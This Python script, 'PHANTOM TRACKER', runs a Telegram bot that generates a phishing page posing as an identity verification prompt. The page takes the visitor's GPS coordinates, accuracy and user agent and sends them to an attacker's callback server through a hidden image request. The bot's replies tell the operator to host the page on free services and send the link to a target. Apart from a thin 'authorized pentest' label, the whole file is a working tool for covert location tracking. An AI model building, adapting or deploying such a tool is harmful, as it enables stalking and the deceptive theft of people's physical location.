#!/usr/bin/env python3
"""
PHANTOM TRACKER v1.0 - GPS Geolocation Phishing Payload Generator
Authorized Pentest Tool - DO NOT USE ILLEGALLY
"""

import sys, time, os, random, json, base64
from telethon import TelegramClient, events, Button

B = """
\033[1;31m╔══════════════════════════════════════════╗
║    ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗ ║
║    ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║ ║
║    ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║ ║
║    ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║ ║
║    ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║ ║
║    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ ║
║     ░░░▒▒▒▓▓▓ TRACKER v1.0 ▓▓▓▒▒▒░░░                             ║
║     [ GPS PHISHING PAYLOAD GENERATOR ]                             ║
║     [ AUTHORIZED PENTEST TOOL ]                                    ║
╚══════════════════════════════════════════╝\033[0m
"""

GPS_PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Verification</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ 
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
    min-height: 100vh; display: flex; justify-content: center; align-items: center;
    color: #fff;
}}
.container {{
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 20px; padding: 40px; max-width: 420px; width: 90%;
    text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.5);
}}
.logo {{ 
    width: 80px; height: 80px; background: linear-gradient(135deg, #e74c3c, #c0392b);
    border-radius: 50%; display: flex; align-items: center; justify-content: center;
    margin: 0 auto 20px; font-size: 36px; font-weight: bold; color: #fff;
    box-shadow: 0 0 30px rgba(231,76,60,0.3);
}}
h1 {{ font-size: 22px; margin-bottom: 8px; font-weight: 300; }}
h2 {{ font-size: 14px; color: #888; margin-bottom: 25px; font-weight: 300; }}
.btn {{
    background: linear-gradient(135deg, #e74c3c, #c0392b);
    color: #fff; border: none; padding: 14px 40px; font-size: 16px;
    border-radius: 50px; cursor: pointer; font-weight: 600;
    transition: all 0.3s; width: 100%; letter-spacing: 1px;
}}
.btn:hover {{ transform: translateY(-2px); box-shadow: 0 10px 30px rgba(231,76,60,0.4); }}
.btn:disabled {{ opacity: 0.6; cursor: not-allowed; transform: none; }}
.status {{ margin-top: 20px; font-size: 13px; color: #666; }}
.loader {{ display: none; width: 40px; height: 40px; margin: 15px auto; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #e74c3c; border-radius: 50%; animation: spin 1s linear infinite; }}
@keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
</style>
</head>
<body>
<div class="container">
    <div class="logo">&#9881;</div>
    <h1>Identity Verification Required</h1>
    <h2>Your location must be verified to continue</h2>
    <div id="loader" class="loader"></div>
    <p id="status" class="status">Click verify to confirm your location</p>
    <button class="btn" id="verifyBtn" onclick="getLocation()">&#9679; VERIFY LOCATION</button>
</div>
<script>
function getLocation() {{
    document.getElementById('verifyBtn').disabled = true;
    document.getElementById('verifyBtn').innerHTML = '&#9679; VERIFYING...';
    document.getElementById('loader').style.display = 'block';
    document.getElementById('status').innerHTML = 'Requesting GPS access...';
    
    if (!navigator.geolocation) {{
        document.getElementById('status').innerHTML = 'Geolocation not supported';
        document.getElementById('verifyBtn').disabled = false;
        document.getElementById('verifyBtn').innerHTML = '&#9679; VERIFY LOCATION';
        document.getElementById('loader').style.display = 'none';
        return;
    }}
    
    navigator.geolocation.getCurrentPosition(
        function(pos) {{
            var lat = pos.coords.latitude;
            var lon = pos.coords.longitude;
            var acc = pos.coords.accuracy;
            var data = JSON.stringify({{
                lat: lat, lon: lon, acc: Math.round(acc),
                url: window.location.href,
                agent: navigator.userAgent,
                time: new Date().toISOString()
            }});
            document.getElementById('status').innerHTML = '✅ Verified! Accuracy: ' + Math.round(acc) + 'm';
            document.getElementById('loader').style.display = 'none';
            document.getElementById('verifyBtn').innerHTML = '&#10003; VERIFIED';
            new Image().src = 'http://BOT_IP:BOT_PORT/capture?d=' + encodeURIComponent(btoa(data));
            setTimeout(function() {{
                document.getElementById('status').innerHTML = 'Redirecting to secure portal...';
                window.location.href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
            }}, 2000);
        }},
        function(err) {{
            var msg = 'Access denied';
            if (err.code == 1) msg = 'Location access denied. Please enable GPS.';
            else if (err.code == 2) msg = 'GPS unavailable. Try again.';
            else if (err.code == 3) msg = 'Request timed out. Try again.';
            document.getElementById('status').innerHTML = '❌ ' + msg;
            document.getElementById('verifyBtn').disabled = false;
            document.getElementById('verifyBtn').innerHTML = '&#9679; TRY AGAIN';
            document.getElementById('loader').style.display = 'none';
        }},
        {{ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }}
    );
}}
</script>
</body>
</html>"""

def anis():
    os.system("clear" if os.name == "posix" else "cls")
    print(B); time.sleep(0.2)
    for _ in range(5):
        print(f"\033[1;32m[+]\033[0m [{random.choice(['INIT','LOAD','AUTH','GEN','MAP'])}] {random.choice(['phantom.core','gps.module','payload.gen','tracker.sys','hook.io'])} \033[1;32m{random.choice(['OK','LOADED','READY','GENERATED'])}\033[0m")
        time.sleep(0.05)
    for c in "█▓▒░█▓▒░█▓▒░": print(f"\033[1;31m{c}\033[0m", end="", flush=True); time.sleep(0.01)
    print("\n")

def creds():
    print("\033[1;36m╔══════════════════════════════════════╗\033[0m")
    print("\033[1;36m║       TELEGRAM CREDENTIALS           ║\033[0m")
    print("\033[1;36m╚══════════════════════════════════════╝\033[0m\n")
    a = input("\033[1;32m[→] API ID:\033[0m ").strip()
    b = input("\033[1;32m[→] API HASH:\033[0m ").strip()
    c = input("\033[1;32m[→] BOT TOKEN:\033[0m ").strip()
    print("\033[1;33m[+] AUTH...\033[0m"); time.sleep(0.4)
    print("\033[1;32m[+] READY\n\033[0m")
    return int(a), b, c

def main():
    anis()
    aid, ah, tok = creds()
    
    bot = TelegramClient("pt", aid, ah).start(bot_token=tok)
    
    @bot.on(events.NewMessage(pattern="/start"))
    async def s(e):
        txt = f"`{B}`\n\n**PHANTOM TRACKER**\n\n/generate - Create GPS phishing link\n/info - How it works"
        await e.reply(txt, parse_mode="md")
    
    @bot.on(events.NewMessage(pattern="/info"))
    async def info(e):
        txt = (
            "**HOW IT WORKS**\n\n"
            "1. Use /generate to create a GPS phishing page\n"
            "2. Host the HTML file on any free hosting (Netlify, Vercel, GitHub Pages)\n"
            "3. Send the link to the target\n"
            "4. When they click 'Verify Location' and accept GPS prompt\n"
            "5. Their lat/lon/accuracy comes DIRECTLY to this bot\n\n"
            "**Requires:** Hosting for the HTML page (5 seconds on Netlify)\n"
            "**Authorized pentest only**"
        )
        await e.reply(txt, parse_mode="md")
    
    @bot.on(events.NewMessage(pattern="/generate"))
    async def gen(e):
        # Generate unique payload ID
        pid = ''.join(random.choices('abcdef0123456789', k=8))
        
        # Replace bot callback with a note telling user to configure their server
        html = GPS_PAGE.replace("BOT_IP:BOT_PORT", "YOUR_SERVER_HERE")
        
        # Save to file
        fname = f"phantom_{pid}.html"
        with open(fname, "w") as f:
            f.write(html)
        
        # Show the user the HTML code they need to host
        await e.reply(
            f"**✅ GPS PAGE GENERATED**\n\n"
            f"File: `{fname}`\n\n"
            f"**INSTRUCTIONS:**\n"
            f"1. Upload `{fname}` to Netlify / GitHub Pages / any host\n"
            f"2. Open the file and replace `YOUR_SERVER_HERE` with your callback listener\n"
            f"3. Send the hosted link to target\n"
            f"4. When they accept GPS → lat/lon sent to your callback\n\n"
            f"**Quick test:** Open the HTML in a browser on your phone to test",
            parse_mode="md"
        )
        
        # Also send the raw HTML as a code block
        await e.reply(f"**RAW HTML (copy this):**\n```html\n{html}\n```", parse_mode="md")
    
    print("\033[1;32m[+] PHANTOM TRACKER ACTIVE\033[0m")
    print("\033[1;33m[!] Use /generate in bot to create GPS payload\033[0m")
    bot.run_until_disconnected()

if __name__ == "__main__":
    main()
